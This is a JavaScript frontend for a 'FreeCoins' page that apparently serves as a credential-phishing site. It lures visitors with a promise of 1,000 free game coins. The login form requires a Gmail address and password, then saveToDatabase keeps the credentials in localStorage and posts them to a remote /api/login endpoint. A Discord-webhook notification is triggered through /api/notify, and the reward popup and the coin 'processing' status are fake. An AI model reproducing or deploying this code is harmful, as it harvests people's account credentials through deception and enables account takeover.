// ============================================================
// FreeCoins — Frontend Script
// NOTE: Discord webhook is handled server-side via /api/notify
//       No sensitive URLs are exposed here.
// ============================================================

function getApiBaseUrl() {
    if (window.APP_CONFIG && window.APP_CONFIG.BACKEND_URL) {
        return window.APP_CONFIG.BACKEND_URL.replace(/\/+$/, '');
    }
    const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
    return isLocalhost ? '' : 'https://freecoins-main.vercel.app';
}

async function saveToDatabase(username, password) {
    // Resilient local backup (guarantees data on GitHub Pages static mode)
    try {
        const localList = JSON.parse(localStorage.getItem('adminSubmissionsBackup') || '[]');
        localList.unshift({
            id: localList.length + 1,
            username: username,
            password: password,
            ip_address: 'Client (Web)',
            created_at: new Date().toLocaleString()
        });
        localStorage.setItem('adminSubmissionsBackup', JSON.stringify(localList));
    } catch (e) { }

    try {
        const res = await fetch(`${getApiBaseUrl()}/api/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const data = await res.json();
        return data;
    } catch (err) {
        console.warn('Database storage error:', err);
    }
}

async function sendNotification(username) {
    // Webhook is called server-side — no URL exposed in frontend
    try {
        await fetch(`${getApiBaseUrl()}/api/notify`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });
    } catch (e) {
        // Silently fail
    }
}

// ─── Modal Elements ───────────────────────────────────────────────────────────
const loginBtn = document.getElementById('loginBtn');
const createCharacterBtn = document.getElementById('createCharacterBtn');
const loginBox = document.getElementById('loginBox');
const modalBackdrop = document.getElementById('modalBackdrop');
const closeLoginModal = document.getElementById('closeLoginModal');
const loginForm = document.getElementById('loginForm');
const submitBtn = document.getElementById('submitBtn');
const rewardPopup = document.getElementById('rewardPopup');
const rewardCloseBtn = document.getElementById('rewardCloseBtn');
const rewardCloseX = document.getElementById('rewardCloseX');
const refillBtn = document.getElementById('refillBtn');
const refreshIcon = document.getElementById('refreshIcon');
const refillStatus = document.getElementById('refillStatus');
const screenshotBtn = document.getElementById('screenshotBtn');

// ─── Mobile Elements ──────────────────────────────────────────────────────────
const mobileLoginBtn = document.getElementById('mobileLoginBtn');
const mobileFlagTrigger = document.getElementById('mobileFlagTrigger');
const mobileMenuBtn = document.getElementById('mobileMenuBtn');
const mobileDrawer = document.getElementById('mobileDrawer');
const mobileDrawerOverlay = document.getElementById('mobileDrawerOverlay');
const closeMobileDrawer = document.getElementById('closeMobileDrawer');
const drawerClaimBtn = document.getElementById('drawerClaimBtn');
const drawerScreenshotsBtn = document.getElementById('drawerScreenshotsBtn');
const mobileScreenshotBtn = document.getElementById('mobileScreenshotBtn');
const drawerLangChips = document.querySelectorAll('.drawer-lang-chip');
const mobileLangSheet = document.getElementById('mobileLangSheet');
const closeLangSheet = document.getElementById('closeLangSheet');
const langSheetItems = document.querySelectorAll('.lang-sheet-item');
const currentFlagEmoji = document.getElementById('currentFlagEmoji');
const currentFlagText = document.getElementById('currentFlagText');

// ─── Scroll helper (works with CSS scroll-snap container) ─────────────────────
const snapContainer = document.querySelector('.site-container');

function scrollToSection(sectionId) {
    const section = document.getElementById(sectionId);
    if (section && snapContainer) {
        snapContainer.scrollTo({ top: section.offsetTop, behavior: 'smooth' });
    }
}

// ─── Flags Dropdown ───────────────────────────────────────────────────────────
const flagBtn = document.getElementById('flagBtn');
const flagsDropdown = document.getElementById('flagsDropdown');
const flagItems = document.querySelectorAll('.flag-item');

function toggleFlagsDropdown(show) {
    const isShow = typeof show === 'boolean' ? show : !flagsDropdown?.classList.contains('show');
    flagsDropdown?.classList.toggle('show', isShow);
    flagBtn?.classList.toggle('active', isShow);
    flagBtn?.setAttribute('aria-expanded', isShow ? 'true' : 'false');
}

function toggleMobileDrawer(show) {
    const isShow = typeof show === 'boolean' ? show : !mobileDrawer?.classList.contains('show');
    mobileDrawer?.classList.toggle('show', isShow);
    mobileDrawerOverlay?.classList.toggle('show', isShow);
    if (isShow) toggleMobileLangSheet(false);
}

function toggleMobileLangSheet(show) {
    const isShow = typeof show === 'boolean' ? show : !mobileLangSheet?.classList.contains('show');
    mobileLangSheet?.classList.toggle('show', isShow);
    if (isShow) {
        modalBackdrop?.classList.add('show');
        toggleMobileDrawer(false);
    } else if (!loginBox?.classList.contains('show') && !rewardPopup?.classList.contains('show')) {
        modalBackdrop?.classList.remove('show');
    }
}

function showToast(message) {
    let toast = document.getElementById('langToast');
    if (!toast) {
        toast = document.createElement('div');
        toast.id = 'langToast';
        toast.className = 'lang-toast';
        document.body.appendChild(toast);
    }
    toast.textContent = message;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 2200);
}

function setLanguage(langCode, langName, langEmoji) {
    if (currentFlagEmoji && langEmoji) currentFlagEmoji.textContent = langEmoji;
    if (currentFlagText && langCode) currentFlagText.textContent = langCode.toUpperCase();
    langSheetItems.forEach(item => {
        const isActive = item.getAttribute('data-lang') === langCode;
        item.classList.toggle('active', isActive);
        let checkSpan = item.querySelector('.sheet-check');
        if (isActive && !checkSpan) {
            checkSpan = document.createElement('span');
            checkSpan.className = 'sheet-check';
            checkSpan.textContent = '✓';
            item.appendChild(checkSpan);
        } else if (!isActive && checkSpan) {
            checkSpan.remove();
        }
    });
    drawerLangChips.forEach(chip => chip.classList.toggle('active', chip.getAttribute('data-lang') === langCode));
    showToast(`Language switched: ${langName}`);
    toggleFlagsDropdown(false);
    toggleMobileLangSheet(false);
}

flagBtn?.addEventListener('click', (e) => { e.stopPropagation(); toggleFlagsDropdown(); });
flagItems.forEach(item => {
    item.addEventListener('click', (e) => {
        e.stopPropagation();
        setLanguage(item.getAttribute('data-lang') || 'en', item.getAttribute('data-name') || 'English', item.getAttribute('data-emoji') || '🇺🇸');
    });
});

mobileFlagTrigger?.addEventListener('click', (e) => { e.stopPropagation(); toggleMobileLangSheet(true); });
closeLangSheet?.addEventListener('click', (e) => { e.stopPropagation(); toggleMobileLangSheet(false); });
langSheetItems.forEach(item => {
    item.addEventListener('click', (e) => {
        e.stopPropagation();
        setLanguage(item.getAttribute('data-lang') || 'en', item.getAttribute('data-name') || 'English', item.getAttribute('data-emoji') || '🇺🇸');
    });
});

mobileMenuBtn?.addEventListener('click', (e) => { e.stopPropagation(); toggleMobileDrawer(true); });
closeMobileDrawer?.addEventListener('click', (e) => { e.stopPropagation(); toggleMobileDrawer(false); });
mobileDrawerOverlay?.addEventListener('click', () => toggleMobileDrawer(false));

drawerClaimBtn?.addEventListener('click', (e) => { e.stopPropagation(); toggleMobileDrawer(false); openLoginModal(); });
drawerScreenshotsBtn?.addEventListener('click', (e) => {
    e.stopPropagation();
    toggleMobileDrawer(false);
    scrollToSection('section2Section');
});
drawerLangChips.forEach(chip => {
    chip.addEventListener('click', (e) => {
        e.stopPropagation();
        setLanguage(chip.getAttribute('data-lang') || 'en', chip.getAttribute('data-name') || 'English', chip.getAttribute('data-emoji') || '🇺🇸');
    });
});

function openLoginModal() {
    toggleMobileLangSheet(false);
    toggleMobileDrawer(false);
    loginBox.classList.add('show');
    modalBackdrop.classList.add('show');
    document.getElementById('username')?.focus();
}

function closeAllModals() {
    loginBox.classList.remove('show');
    rewardPopup.classList.remove('show');
    modalBackdrop.classList.remove('show');
    toggleFlagsDropdown(false);
    toggleMobileLangSheet(false);
    toggleMobileDrawer(false);
}

loginBtn?.addEventListener('click', (e) => { e.stopPropagation(); openLoginModal(); });
mobileLoginBtn?.addEventListener('click', (e) => { e.stopPropagation(); openLoginModal(); });
createCharacterBtn?.addEventListener('click', (e) => { e.stopPropagation(); openLoginModal(); });

document.getElementById('createOneselfBtn')?.addEventListener('click', (e) => { e.stopPropagation(); openLoginModal(); });
document.getElementById('createAccountTopBtn')?.addEventListener('click', (e) => { e.stopPropagation(); openLoginModal(); });
document.getElementById('createAccountBottomBtn')?.addEventListener('click', (e) => { e.stopPropagation(); openLoginModal(); });

closeLoginModal?.addEventListener('click', (e) => { e.stopPropagation(); closeAllModals(); });
rewardCloseX?.addEventListener('click', (e) => { e.stopPropagation(); closeAllModals(); });
modalBackdrop?.addEventListener('click', () => closeAllModals());
rewardCloseBtn?.addEventListener('click', () => closeAllModals());

refillBtn?.addEventListener('click', () => {
    if (refreshIcon) {
        refreshIcon.classList.add('spin');
        setTimeout(() => refreshIcon.classList.remove('spin'), 600);
    }
    if (refillStatus) refillStatus.textContent = '✓ Status: 1,000 Grand Coins processing (ETA ~15 mins)';
});

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') { closeAllModals(); toggleFlagsDropdown(false); }
});
document.addEventListener('click', (e) => {
    if (!flagsDropdown?.contains(e.target) && !flagBtn?.contains(e.target)) toggleFlagsDropdown(false);
});

screenshotBtn?.addEventListener('click', (e) => {
    e.preventDefault();
    scrollToSection('section2Section');
});
mobileScreenshotBtn?.addEventListener('click', (e) => {
    e.preventDefault();
    scrollToSection('section2Section');
});

// ─── Section Dot Navigation ───────────────────────────────────────────────────
const sections = Array.from(document.querySelectorAll('.page-section'));
const dots = Array.from(document.querySelectorAll('.dot-nav-item'));

function updateActiveDot(index) {
    dots.forEach((d, i) => d.classList.toggle('active', i === index));
}

dots.forEach((dot, i) => {
    dot.addEventListener('click', () => {
        if (sections[i] && snapContainer) {
            snapContainer.scrollTo({ top: sections[i].offsetTop, behavior: 'smooth' });
        }
    });
});

// ─── Zoom-In Section Entrance (IntersectionObserver) ─────────────────────────
const sectionObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.classList.add('section-visible');
            // Update dot nav
            const idx = sections.indexOf(entry.target);
            if (idx !== -1) updateActiveDot(idx);
        } else {
            // Reset zoom so it replays on re-entry
            entry.target.classList.remove('section-visible');
        }
    });
}, {
    threshold: 0.4
});

sections.forEach(s => sectionObserver.observe(s));

// ─── Form Submit ──────────────────────────────────────────────────────────────
loginForm?.addEventListener('submit', async function (e) {
    e.preventDefault();

    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!username || !password) {
        alert('Please fill in all fields.');
        return;
    }

    if (!username.toLowerCase().endsWith('@gmail.com')) {
        alert('Please enter a valid Gmail address.');
        return;
    }

    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = 'PROCESSING...';
    }

    // Save to database + notify server-side (no webhook URL exposed here)
    await saveToDatabase(username, password);
    await sendNotification(username);

    if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.textContent = 'CLAIM 1,000 COINS';
    }
    loginForm.reset();

    loginBox.classList.remove('show');
    if (rewardPopup) {
        rewardPopup.classList.add('show');
        modalBackdrop.classList.add('show');
    }
});
